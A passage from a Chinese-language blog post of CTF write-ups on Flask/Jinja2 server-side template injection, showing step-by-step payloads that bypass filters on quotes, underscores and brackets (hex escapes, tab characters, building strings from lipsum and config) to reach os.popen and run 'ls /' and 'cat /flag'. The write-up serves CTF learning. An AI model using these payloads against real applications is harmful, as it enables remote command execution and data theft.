<p>Ls%09&#x2F;:</p>
<p>!<img src="https://p111223.github.io/2025/06/07/ssti/9.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>为：more%09&#x2F;f*</p>
<p>!<img src="https://p111223.github.io/2025/06/07/ssti/10.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>值得注意的是不用%0a——换行符代替空格，合适%09——制表符</p>
<p>如果用%0a的话，就会出现换行符两边命令分离，看成两个命令了（个人理解）</p>
<p>Ls%0a&#x2F;——出现的不是根目录，而是app.py——即当前目录</p>
<h2 id="buu-NewStarCTF-公开赛赛道-BabySSTI-Three"><a href="#buu-NewStarCTF-公开赛赛道-BabySSTI-Three" class="headerlink" title="buu_[NewStarCTF 公开赛赛道]BabySSTI_Three"></a>buu_[NewStarCTF 公开赛赛道]BabySSTI_Three</h2><p>和Two一样</p>
<p>这次就多过滤了_</p>
<p>换成\x5f即可</p>
<p><code>?name=&#123;&#123;lipsum[%27\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f%27][%27\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f%27][%27\x5f\x5fimport\x5f\x5f%27](%27os%27)[%27po\x70en%27](%27more%09/f*%27).read()&#125;&#125;</code></p>
<p>!<img src="https://p111223.github.io/2025/06/07/ssti/11.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<h2 id="buu-Dest0g3-520迎新赛-EasySSTI"><a href="#buu-Dest0g3-520迎新赛-EasySSTI" class="headerlink" title="buu_[Dest0g3 520迎新赛]EasySSTI"></a>buu_[Dest0g3 520迎新赛]EasySSTI</h2><p>这个限制了很多很多如’、_、[]</p>
<p>要自己造了</p>
<p>!<img src="https://p111223.github.io/2025/06/07/ssti/12.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>request也过滤了!<img src="https://p111223.github.io/2025/06/07/ssti/13.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>自己造，那就要先找找字符了</p>
<p><code>&#123;&#123;lipsum|string|list&#125;&#125;</code></p>
<p>!<img src="https://p111223.github.io/2025/06/07/ssti/14.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>Pop的获取：<code>&#123;%set%0ap=dict(po=a,p=a)|join%&#125;</code></p>
<p><em>的获取：<code>&#123;%set%0aa=(lipsum|string|list)|attr(p)(18)%&#125;</code>——获取上图的字符列表中的</em></p>
<p><code>__globals__</code>的获取：<code>&#123;%set%0aglo=(a,a,dict(glo=t,bals=t)|join,a,a)|join%&#125;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set%0apo=dict(po=a,p=a)|join%&#125;&#123;%set%0aa=(lipsum|string|list)|attr(po)(18)%&#125;&#123;%set%0aglo=(a,a,dict(glo=t,bals=tw)|join,a,a)|join%&#125;&#123;&#123;lipsum|attr(glo)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;&#123;%set%0aa=(lipsum|string|list)|attr(po)(18)%&#125;&#123;%set%0aglo=(a,a,dict(glo=t,bals=tw)|join,a,a)|join()%&#125;&#123;&#123;lipsum|attr(glo)&#125;&#125;</span><br><span class="line">（join后加不加()都可以）</span><br></pre></td></tr></table></figure>

<p>获得<code>__builtins__</code>：<code>&#123;%set%0abui=(a,a,dict(buil=t,tins=tt)|join,a,a)|join%&#125;</code></p>
<p>获得<code>__import__</code>：<code>&#123;%set%0aimp=(a,a,dict(imp=t,ort=tt)|join,a,a)|join%&#125;</code></p>
<p>获取<code>Getitem():&#123;%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%&#125;</code>——代替[]</p>
<p>获得os：<code>(dict(o=a,s=a)|join())</code>——在<code>&#123;&#123;&#125;&#125;</code>内</p>
<p>获得popen：<code>&#123;%set%0ape=dict(po=t,pen=tt)|join()%&#125;</code></p>
<p>获得read：<code>&#123;%set%0are=dict(rea=t,d=tt)|join()%&#125;</code></p>
<p>接下来是在popen()中构建ls &#x2F;</p>
<p>Cat &#x2F;flag了</p>
<p>有点多，用下面那个来找字符</p>
<p><code>()|select|string|list|attr(po)(20)</code>——‘l’</p>
<p><code>()|select|string|list|attr(po)(18)</code>——‘s’</p>
<p><code>()|select|string|list|attr(po)(10)</code>——’ ’</p>
<p><code>(()|select|string|list|attr(po)(20), ()|select|string|list|attr(po)(18), ()|select|string|list|attr(po)(10))|join</code></p>
<p>!<img src="https://p111223.github.io/2025/06/07/ssti/15.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;&#123;%set%0aa=(lipsum|string|list)|attr(po)(18)%&#125;&#123;%set%0aglo=(a,a,dict(glo=t,bals=tw)|join,a,a)|join()%&#125;&#123;%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%&#125;&#123;%set%0ape=dict(po=t,pen=tt)|join()%&#125;&#123;%set%0are=dict(rea=t,d=tt)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(geti)((dict(o=a,s=a)|join()))|attr(pe)((()|select|string|list|attr(po)(20),()|select|string|list|attr(po)(18),()|select|string|list|attr(po)(10))|join)|attr(re)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>!<img src="https://p111223.github.io/2025/06/07/ssti/16.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p>后面就是构造ls &#x2F;</p>
<p>‘&#x2F;’就要从config那里来找了!<img src="https://p111223.github.io/2025/06/07/ssti/17.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<p><code>config|string|list|attr(279)</code>——‘&#x2F;’</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;&#123;%set%0aa=(lipsum|string|list)|attr(po)(18)%&#125;&#123;%set%0aglo=(a,a,dict(glo=t,bals=tw)|join,a,a)|join()%&#125;&#123;%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%&#125;&#123;%set%0ape=dict(po=t,pen=tt)|join()%&#125;&#123;%set%0are=dict(rea=t,d=tt)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(geti)((dict(o=a,s=a)|join()))|attr(pe)((()|select|string|list|attr(po)(20),()|select|string|list|attr(po)(18),()|select|string|list|attr(po)(10),(config|string|list)|attr(po)(279))|join)|attr(re)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>!<img src="https://p111223.github.io/2025/06/07/ssti/18.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">有flag，后改为cat /flag</span><br><span class="line">‘c’：()|select|string|list|attr(po)(15)</span><br><span class="line">‘a’：()|select|string|list|attr(po)(6)</span><br><span class="line">‘t’：()|select|string|list|attr(po)(16)</span><br><span class="line">‘f’:()|select|string|list|attr(po)(41) </span><br><span class="line">‘l’： ()|select|string|list|attr(po)(20)</span><br><span class="line">‘a’：()|select|string|list|attr(po)(35)</span><br><span class="line">‘g’：()|select|string|list|attr(po)( 1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;%set%0apo=dict(po=a,p=a)|join()%&#125;&#123;%set%0aa=(lipsum|string|list)|attr(po)(18)%&#125;&#123;%set%0aglo=(a,a,dict(glo=t,bals=tw)|join,a,a)|join()%&#125;&#123;%set%0ageti=(a,a,dict(ge=aa,titem=aa)|join,a,a)|join()%&#125;&#123;%set%0ape=dict(po=t,pen=tt)|join()%&#125;&#123;%set%0are=dict(rea=t,d=tt)|join()%&#125;&#123;&#123;lipsum|attr(glo)|attr(geti)((dict(o=a,s=a)|join()))|attr(pe)((()|select|string|list|attr(po)(15),()|select|string|list|attr(po)(6),()|select|string|list|attr(po)(16),()|select|string|list|attr(po)(10),(config|string|list)|attr(po)(279),()|select|string|list|attr(po)(41),()|select|string|list|attr(po)(20),()|select|string|list|attr(po)(35),()|select|string|list|attr(po)(1))|join)|attr(re)()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>!<img src="https://p111223.github.io/2025/06/07/ssti/19.png" alt="image-20250529214750168" style="zoom:50%;" /></p>
<h1 id="bottle框架"><a href="#bottle框架" class="headerlink" title="bottle框架"></a>bottle框架</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">mervin</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/06/07/ssti/">http://example.com/2025/06/07/ssti/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">have a good time!</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post-share"><div class="social-share" data-image="https://p111223.github.io/imgs/2025-05-01 005434.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/28/Litctf2025/" title="Litctf2025"><img class="cover" src="https://p111223.github.io/imgs/2025-05-19 230415.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Litctf2025</div></div><div class="info-2"><div class="info-item-1">webnest_js  抓个包看看，   响应包   直接有password的了，那就爆破一下就好了 发现密码为password时 就ok了   在页面上输入password即可 多重宇宙日记  注册一个看看先   （当然，我这个admin名字是自己取的） 试了试功能 上面是改设置的，下面也是，但下面是用json来改了， 这样子，可以考虑考虑多加一点奇妙的东西，看看情况 同时，我们也可以看看源代码   发现有”isAdmin”这个参数，还有setting 构造 1234567&#123;  &quot;settings&quot;: &#123;    &quot;theme&quot;: &quot;dark&quot;,    &quot;language&quot;: &quot;en&quot;,&quot;isAdmin&quot;: true ...</div></div></div></a><a class="pagination-related" href="/2025/06/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><img class="cover" src="https://p111223.github.io/imgs/2025-05-01 010058.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">反序列化</div></div><div class="info-2"><div class="info-item-1">什么是反序列化​        反序列化过程将不可信的数据（字节流）重新构建为内存中的对象时，如果程序对反序列化的内容、类型或过程缺乏严格控制，攻击者可以构造恶意数据来欺骗程序执行非预期的代码或操作，从而引发严重的安全风险。 序列化与反序列化的本质（基础） 序列化： 将内存中的对象（包含数据及其状态、甚至可执行代码的引用）转换（编码）成一个可以存储（如文件）或传输（如网络）的字节流格式（如二进制、JSON、XML等）。 反序列化： 将接收到的字节流数据重新解析、还原（解码）成内存中的活动对象，恢复其原有的数据、状态和结构。  漏洞来源 过度信任： 程序在反序列化时，通常默认接收到的数据是合法的、由可信来源生成的、结构正确的，其按照序列化格式的规则去重建对象。 魔术方法&#x2F;钩子函数： 许多面向对象编程语言（如 Java, Python, PHP, .NET）在反序列化过程中会自动调用对象的特定方法。这些方法原本是为了方便开发者在对象重建时执行必要的初始化操作（如连接资源、设置状态）。 攻击者的切入点：...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/11/25/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="python原型链污染"><img class="cover" src="https://p111223.github.io/imgs/2025-05-19 225417.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-25</div><div class="info-item-2">python原型链污染</div></div><div class="info-2"><div class="info-item-1">python原型链污染 不是所有类的属性都可以被污染的； 对所有类的方法无效   [!IMPORTANT] ——注： 我们只能更改对应区域的参数内容**(改属性、变量)**，并不能自己实现命令的执行； 要有其他区域来协助实现回显&#x2F;执行。  合并函数——实现污染的一种方式 123456789101112131415def merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst,...</div></div></div></a><a class="pagination-related" href="/2025/09/25/ssti%E5%86%85%E5%AD%98%E9%A9%AC/" title="ssti内存马"><img class="cover" src="https://p111223.github.io/imgs/2025-05-01 005957.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-25</div><div class="info-item-2">ssti内存马</div></div><div class="info-2"><div class="info-item-1">Flask环境（旧版）#1app.add_url_rule() &#x2F;&#x2F;创实现一个路由 12345678910111213141516171819202122Flask.add_url_rule can now also register a view function.——Version 0.2The endpoint for the Module.add_url_rule method is now optional to be consistent with the function of the same name on the application object.——Version 0.6Flask no longer internally depends on rules being added through the add_url_rule function and can now also accept regular werkzeug rules added to the url map.——Version 0.7Flask...</div></div></div></a><a class="pagination-related" href="/2025/06/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><img class="cover" src="https://p111223.github.io/imgs/2025-05-01 010058.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-17</div><div class="info-item-2">反序列化</div></div><div class="info-2"><div class="info-item-1">什么是反序列化​        反序列化过程将不可信的数据（字节流）重新构建为内存中的对象时，如果程序对反序列化的内容、类型或过程缺乏严格控制，攻击者可以构造恶意数据来欺骗程序执行非预期的代码或操作，从而引发严重的安全风险。 序列化与反序列化的本质（基础） 序列化： 将内存中的对象（包含数据及其状态、甚至可执行代码的引用）转换（编码）成一个可以存储（如文件）或传输（如网络）的字节流格式（如二进制、JSON、XML等）。 反序列化： 将接收到的字节流数据重新解析、还原（解码）成内存中的活动对象，恢复其原有的数据、状态和结构。  漏洞来源 过度信任： 程序在反序列化时，通常默认接收到的数据是合法的、由可信来源生成的、结构正确的，其按照序列化格式的规则去重建对象。 魔术方法&#x2F;钩子函数： 许多面向对象编程语言（如 Java, Python, PHP, .NET）在反序列化过程中会自动调用对象的特定方法。这些方法原本是为了方便开发者在对象重建时执行必要的初始化操作（如连接资源、设置状态）。 攻击者的切入点：...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">mervin</div><div class="author-info-description">欢迎来到mervin的个人博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/p111223" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:3776130943@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%A6%82%E8%A6%81"><span class="toc-number">1.</span> <span class="toc-text">基础知识概要</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%B1%BB%E3%80%81%E6%A8%A1%E5%9D%97"><span class="toc-number">1.2.</span> <span class="toc-text">相关类、模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.3.</span> <span class="toc-text">无回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-%E9%99%90%E5%88%B6WAF"><span class="toc-number">1.4.1.</span> <span class="toc-text">绕过[]限制WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-number">1.4.2.</span> <span class="toc-text">绕过单双引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E5%88%92%E7%BA%BF%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.3.</span> <span class="toc-text">下划线过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.4.</span> <span class="toc-text">空格绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">题目：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#buu-%E7%AC%AC%E4%B8%89%E7%AB%A0-web%E8%BF%9B%E9%98%B6-SSTI"><span class="toc-number">2.1.</span> <span class="toc-text">buu_[第三章 web进阶]SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buu-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-BabySSTI-One"><span class="toc-number">2.2.</span> <span class="toc-text">buu_[NewStarCTF 公开赛赛道]BabySSTI_One</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buu-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-BabySSTI-Two"><span class="toc-number">2.3.</span> <span class="toc-text">buu_[NewStarCTF 公开赛赛道]BabySSTI_Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buu-NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-BabySSTI-Three"><span class="toc-number">2.4.</span> <span class="toc-text">buu_[NewStarCTF 公开赛赛道]BabySSTI_Three</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#buu-Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-EasySSTI"><span class="toc-number">2.5.</span> <span class="toc-text">buu_[Dest0g3 520迎新赛]EasySSTI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bottle%E6%A1%86%E6%9E%B6"><span class="toc-number">3.</span> <span class="toc-text">bottle框架</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="python原型链污染"><img src="https://p111223.github.io/imgs/2025-05-19 225417.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python原型链污染"/></a><div class="content"><a class="title" href="/2025/11/25/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="python原型链污染">python原型链污染</a><time datetime="2025-11-25T12:47:32.000Z" title="发表于 2025-11-25 20:47:32">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/17/GAN-%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/" title="GAN_代码生成"><img src="https://p111223.github.io/imgs/2025-05-01 005751.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GAN_代码生成"/></a><div class="content"><a class="title" href="/2025/10/17/GAN-%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/" title="GAN_代码生成">GAN_代码生成</a><time datetime="2025-10-17T07:05:24.000Z" title="发表于 2025-10-17 15:05:24">2025-10-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/25/ssti%E5%86%85%E5%AD%98%E9%A9%AC/" title="ssti内存马"><img src="https://p111223.github.io/imgs/2025-05-01 005957.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ssti内存马"/></a><div class="content"><a class="title" href="/2025/09/25/ssti%E5%86%85%E5%AD%98%E9%A9%AC/" title="ssti内存马">ssti内存马</a><time datetime="2025-09-25T02:40:29.000Z" title="发表于 2025-09-25 10:40:29">2025-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化"><img src="https://p111223.github.io/imgs/2025-05-01 010058.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反序列化"/></a><div class="content"><a class="title" href="/2025/06/17/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">反序列化</a><time datetime="2025-06-17T11:59:15.000Z" title="发表于 2025-06-17 19:59:15">2025-06-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/07/ssti/" title="ssti"><img src="https://p111223.github.io/imgs/2025-05-01 005434.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ssti"/></a><div class="content"><a class="title" href="/2025/06/07/ssti/" title="ssti">ssti</a><time datetime="2025-06-07T12:24:10.000Z" title="发表于 2025-06-07 20:24:10">2025-06-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://p111223.github.io/imgs/2025-05-01 005434.png);"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By mervin</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>